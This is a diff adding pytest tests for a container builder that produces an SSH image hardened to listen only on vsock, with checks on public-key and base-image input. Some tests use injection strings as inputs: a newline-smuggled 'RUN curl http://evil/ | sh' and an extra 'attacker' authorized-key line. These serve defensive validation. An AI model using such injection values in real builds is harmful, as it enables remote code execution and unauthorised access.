@@ -17,13 +17,16 @@ from terok_executor.container.build import (
     _normalize_base_image,
     _split_image_ref,
     build_base_images,
+    build_l0g_image,
     build_sidecar_image,
     detect_family,
     l0_image_tag,
+    l0g_image_tag,
     l1_image_tag,
     l1_sidecar_image_tag,
     prepare_build_context,
     render_l0,
+    render_l0g,
     render_l1,
     render_l1_sidecar,
     stage_help_fragments,
@@ -600,6 +603,305 @@ class TestTemplateRendering:
         content = render_l1_sidecar("terok-l0:test", family="deb", tool_name="nonexistent")
         assert "FROM" in content
         assert "coderabbit" not in content.lower()
+
+    def test_l0g_is_valid_dockerfile(self) -> None:
+        """L0G renders a syntactically plausible Dockerfile."""
+        content = render_l0g("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        assert content.startswith("# syntax=docker")
+        assert "FROM" in content
+        assert 'CMD ["/sbin/init"]' in content
+
+    def test_l0g_deb_uses_apt_and_ssh_socket(self) -> None:
+        """On deb, install via apt and target the `ssh.socket` unit name."""
+        content = render_l0g("ubuntu:24.04", family="deb", host_pubkey="ssh-ed25519 AAAA test")
+        assert "apt-get install" in content
+        assert "openssh-server" in content
+        assert "/etc/systemd/system/ssh.socket.d/" in content
+        assert "systemctl enable ssh.socket" in content
+
+    def test_l0g_rpm_uses_dnf_and_sshd_socket(self) -> None:
+        """On rpm, install via dnf and target the `sshd.socket` unit name."""
+        content = render_l0g(
+            "registry.fedoraproject.org/fedora:44",
+            family="rpm",
+            host_pubkey="ssh-ed25519 AAAA test",
+        )
+        assert "dnf install" in content
+        assert "openssh-server" in content
+        assert "/etc/systemd/system/sshd.socket.d/" in content
+        assert "systemctl enable sshd.socket" in content
+
+    def test_l0g_binds_sshd_to_vsock_only(self) -> None:
+        """The systemd drop-in clears TCP listen *and* binds vsock::22.
+
+        Both the empty ``ListenStream=`` (which clears the inherited TCP
+        listener) and the vsock re-bind must appear in the rendered
+        printf block, in that order — a missing reset would silently
+        leave the inherited TCP socket open.
+        """
+        content = render_l0g("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        # Find the printf block that emits the unit override and assert
+        # both directives are present *and* the reset precedes the bind.
+        # ``'ListenStream='`` (empty value) is the wipe; ``'ListenStream=vsock::22'``
+        # is the rebind.  The single-quoted printf args are emitted on
+        # successive lines, so a substring search for the wipe line is
+        # the test — it cannot match the rebind line by accident because
+        # ``'ListenStream=' \\`` carries the trailing backslash separator.
+        wipe = "'ListenStream=' \\"
+        rebind = "'ListenStream=vsock::22' \\"
+        assert wipe in content, "missing empty ListenStream= wipe — TCP would stay open"
+        assert rebind in content, "missing vsock::22 ListenStream re-bind"
+        assert content.index(wipe) < content.index(rebind), (
+            "ListenStream= wipe must precede the vsock::22 rebind for the override to take effect"
+        )
+
+    def test_l0g_hardens_sshd(self) -> None:
+        """sshd drop-in turns off everything but pubkey for the dev user."""
+        content = render_l0g("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        for directive in (
+            "PermitRootLogin no",
+            "PasswordAuthentication no",
+            "PermitEmptyPasswords no",
+            "PubkeyAuthentication yes",
+            "AllowUsers dev",
+            "AllowAgentForwarding no",
+            "AllowTcpForwarding no",
+            "X11Forwarding no",
+            "AuthorizedKeysFile /etc/ssh/authorized_keys.d/terok",
+        ):
+            assert directive in content, f"missing hardening directive: {directive!r}"
+
+    def test_l0g_bakes_host_pubkey_at_build_time(self) -> None:
+        """The host pubkey flows into the Dockerfile via ARG + a `printf` write."""
+        content = render_l0g("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        assert "ARG KRUN_HOST_PUBKEY" in content
+        assert "/etc/ssh/authorized_keys.d/terok" in content
+
+    def test_l0g_image_tag_naming(self) -> None:
+        """`l0g_image_tag` keeps the same base-tag scheme as L0/L1."""
+        assert l0g_image_tag("ubuntu:24.04") == "terok-l0g:ubuntu-24.04"
+        # The same _base_tag helper L0/L1 use — registry prefixes are
+        # preserved verbatim so two bases with identical leaf names but
+        # different registries don't collide.
+        assert l0g_image_tag("fedora:44") == "terok-l0g:fedora-44"
+
+    def test_build_l0g_rejects_empty_pubkey(self) -> None:
+        """An empty pubkey would build a silently-useless image — refuse it."""
+        with pytest.raises(BuildError, match="non-empty"):
+            build_l0g_image("ubuntu:24.04", host_pubkey="")
+
+    def test_build_l0g_rejects_whitespace_pubkey(self) -> None:
+        """Whitespace-only pubkey is treated as empty (would write a blank line)."""
+        with pytest.raises(BuildError, match="non-empty"):
+            build_l0g_image("ubuntu:24.04", host_pubkey="   \n\t")
+
+    def test_build_l0g_skips_when_image_already_present(self) -> None:
+        """A cached L0G tag short-circuits before invoking podman build."""
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=True),
+            patch("terok_executor.container.build.build_project_image") as build,
+        ):
+            tag = build_l0g_image("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        assert tag == "terok-l0g:ubuntu-24.04"
+        build.assert_not_called()
+
+    def test_build_l0g_invokes_podman_build_with_buildargs(self, tmp_path: Path) -> None:
+        """End-to-end build path: render, write Dockerfile, shell out.
+
+        The Dockerfile lands in *build_dir*, ``podman build`` is invoked
+        with the pubkey threaded through as a ``--build-arg``, and the
+        returned tag matches ``l0g_image_tag``.
+        """
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=False),
+            patch("terok_executor.container.build.build_project_image") as build,
+        ):
+            tag = build_l0g_image(
+                "ubuntu:24.04",
+                host_pubkey="ssh-ed25519 AAAA test",
+                build_dir=tmp_path,
+            )
+
+        assert tag == "terok-l0g:ubuntu-24.04"
+        dockerfile = tmp_path / "L0G.Dockerfile"
+        assert dockerfile.is_file()
+        rendered = dockerfile.read_text()
+        assert "openssh-server" in rendered
+        build.assert_called_once()
+        call = build.call_args
+        assert call.kwargs["target_tag"] == "terok-l0g:ubuntu-24.04"
+        build_args = call.kwargs["build_args"]
+        assert build_args["BASE_IMAGE"] == "ubuntu:24.04"
+        assert build_args["KRUN_HOST_PUBKEY"] == "ssh-ed25519 AAAA test"
+
+    def test_build_l0g_rebuild_bypasses_image_exists_short_circuit(self, tmp_path: Path) -> None:
+        """``rebuild=True`` forces the build even when the tag already exists."""
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=True),
+            patch("terok_executor.container.build.build_project_image") as build,
+        ):
+            build_l0g_image(
+                "ubuntu:24.04",
+                host_pubkey="ssh-ed25519 AAAA test",
+                rebuild=True,
+                build_dir=tmp_path,
+            )
+        build.assert_called_once()
+
+    def test_l0g_template_masks_default_tcp_ssh_service(self) -> None:
+        """The post-install ``ssh.service`` / ``sshd.service`` is masked.
+
+        ``openssh-server``'s post-install on many distros enables the
+        TCP-listening service.  Our socket-activated path covers vsock;
+        we must additionally mask the daemon-mode unit so it can't come
+        up behind our back and start binding TCP/22.
+        """
+        # deb maps to ``ssh.service``
+        deb = render_l0g("ubuntu:24.04", family="deb", host_pubkey="ssh-ed25519 AAAA t")
+        assert "systemctl mask ssh.service" in deb
+        # rpm maps to ``sshd.service``
+        rpm = render_l0g("fedora:44", family="rpm", host_pubkey="ssh-ed25519 AAAA t")
+        assert "systemctl mask sshd.service" in rpm
+
+    def test_build_l0g_full_rebuild_forwards_no_cache_and_pull_always(self, tmp_path: Path) -> None:
+        """``full_rebuild=True`` reaches the podman invocation with cache-busting."""
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=False),
+            patch("terok_executor.container.build.build_project_image") as build,
+        ):
+            build_l0g_image(
+                "ubuntu:24.04",
+                host_pubkey="ssh-ed25519 AAAA test",
+                full_rebuild=True,
+                build_dir=tmp_path,
+            )
+        call = build.call_args
+        assert call.kwargs["no_cache"] is True
+        assert call.kwargs["pull_always"] is True
+
+    def test_build_l0g_without_build_dir_uses_owned_tempdir(self) -> None:
+        """Without an explicit build_dir, the helper mkdtemps + cleans up.
+
+        Exercises the ``own_tmp = True`` branch + the final
+        ``shutil.rmtree`` cleanup that runs when the helper owns its
+        build context.
+        """
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=False),
+            patch("terok_executor.container.build.build_project_image") as build,
+        ):
+            tag = build_l0g_image("ubuntu:24.04", host_pubkey="ssh-ed25519 AAAA test")
+        assert tag == "terok-l0g:ubuntu-24.04"
+        # podman build was invoked with a tempdir-rooted dockerfile path.
+        call = build.call_args
+        df = call.kwargs["dockerfile"]
+        assert df.name == "L0G.Dockerfile"
+        # The owned tempdir was removed once the build returned — the
+        # caller never has to worry about leaking ``terok-executor-l0g-*``
+        # directories.
+        assert not df.parent.exists()
+
+    def test_build_l0g_rejects_pubkey_with_newline(self) -> None:
+        """Multi-line pubkey would add extra trust entries to authorized_keys."""
+        with pytest.raises(BuildError, match="single line"):
+            build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA t\nssh-ed25519 AAAB attacker",
+            )
+
+    def test_build_l0g_rejects_pubkey_with_embedded_carriage_return(self) -> None:
+        """A CR in the middle of the line would split the printf write.
+
+        Trailing ``\\r\\n`` is fine — it's stripped before validation.
+        Only embedded CRs are problematic.
+        """
+        with pytest.raises(BuildError, match="single line"):
+            build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA\rrogue",
+            )
+
+    def test_build_l0g_rejects_malformed_pubkey(self) -> None:
+        """A non-OpenSSH-shaped string is refused before reaching podman build."""
+        with pytest.raises(BuildError, match="not a recognisable OpenSSH"):
+            build_l0g_image("fedora:44", host_pubkey="not-a-key garbage")
+
+    def test_build_l0g_accepts_pubkey_with_comment(self) -> None:
+        """Standard ``ssh-… <b64> <comment>`` lines round-trip cleanly."""
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=False),
+            patch("terok_executor.container.build.build_project_image"),
+        ):
+            tag = build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA krun-host (terok)",
+            )
+        assert tag == "terok-l0g:fedora-44"
+
+    def test_build_l0g_rejects_base_image_with_newline(self) -> None:
+        """A newline in base_image would inject Dockerfile directives."""
+        with pytest.raises(BuildError, match="whitespace or control"):
+            build_l0g_image(
+                "fedora:44\nRUN curl http://evil/ | sh",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
+
+    def test_build_l0g_rejects_base_image_with_control_char(self) -> None:
+        """Embedded null/ESC similarly forbidden."""
+        with pytest.raises(BuildError, match="whitespace or control"):
+            build_l0g_image(
+                "fedora:44\x00",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
+
+    def test_build_l0g_rejects_malformed_base_image(self) -> None:
+        """Refs that don't match the loose OCI shape are refused."""
+        with pytest.raises(BuildError, match="OCI reference shape"):
+            build_l0g_image(
+                "!!!not-a-ref!!!",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
+
+    def test_build_l0g_translates_oswrite_failure_to_build_error(self, tmp_path: Path) -> None:
+        """A failed Dockerfile write surfaces as ``BuildError`` with context."""
+        from unittest.mock import patch
+
+        # Make the build context unwritable so write_text raises OSError.
+        ro_dir = tmp_path / "readonly"
+        ro_dir.mkdir()
+        ro_dir.chmod(0o500)  # r-x — no write bit
+        try:
+            with (
+                patch("terok_executor.container.build._check_podman"),
+                patch("terok_executor.container.build._image_exists", return_value=False),
+                patch("terok_executor.container.build.build_project_image"),
+                pytest.raises(BuildError, match="L0G build context"),
+            ):
+                build_l0g_image(
+                    "ubuntu:24.04",
+                    host_pubkey="ssh-ed25519 AAAA test",
+                    build_dir=ro_dir,
+                )
+        finally:
+            ro_dir.chmod(0o700)  # let the tmp_path fixture clean up
 
 
 # ---------------------------------------------------------------------------
